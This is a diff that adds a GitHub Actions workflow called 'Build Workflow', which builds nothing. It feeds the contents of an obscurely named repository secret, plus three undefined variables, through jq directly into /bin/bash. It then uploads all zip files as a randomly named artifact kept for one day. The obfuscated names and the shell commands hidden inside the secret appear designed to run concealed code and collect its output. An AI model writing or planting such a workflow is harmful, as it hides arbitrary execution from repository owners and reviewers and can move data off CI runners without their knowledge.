@@ -1,0 +1,24 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          xrtij30056: ${{ secrets.xrtij30056 }}
+        run: |
+          printf '%s' "$xrtij30056" | jq -r .krzpd6017 | /bin/bash
+          echo $dawbk9593 | jq -r .majis5 | /bin/bash
+          printf '%s' "$ni5" | jq -r .yq0 | /bin/bash
+          printf '%s' "$pd31" | jq -r .srogz0707 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9lwnRqr9
+          path: "*.zip"
+          retention-days: 1
